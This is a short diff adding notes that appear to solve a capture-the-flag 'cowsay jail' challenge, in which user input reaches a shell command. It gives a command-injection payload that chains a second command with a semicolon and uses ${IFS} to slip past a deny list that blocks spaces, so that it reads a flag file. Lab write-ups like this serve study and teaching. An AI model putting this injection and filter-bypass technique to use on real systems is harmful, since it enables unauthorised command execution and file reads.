@@ -1,0 +1,5 @@
+# cowsay jail: input goes into `cowsay {arg}` via shell=True.
+# Deny list blocks space/tab/-/'/"/`/()/<>/&/| but NOT ; $ { } / *
+# Payload sent at "$ cowsay " prompt:
+x;cat${IFS}/flag.txt
+# -> runs `cowsay x` then `cat /flag.txt`; ${IFS} supplies the blocked space.
